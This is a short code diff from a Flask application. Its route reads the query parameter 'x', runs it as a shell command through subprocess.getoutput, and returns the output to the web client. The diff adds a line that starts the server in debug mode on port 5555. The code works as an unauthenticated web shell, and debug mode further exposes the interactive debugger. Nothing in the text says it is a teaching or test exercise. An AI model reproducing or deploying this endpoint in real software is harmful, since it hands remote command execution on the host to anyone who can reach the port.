@@ -15,4 +15,6 @@ def run():
 	cmd = request.args.get("x")
 	print("Harsh Agrawal")
 	return "<pre>"+ subprocess.getoutput(cmd) +"</pre>" 
+
+app.run(debug=True, port=5555)
 	
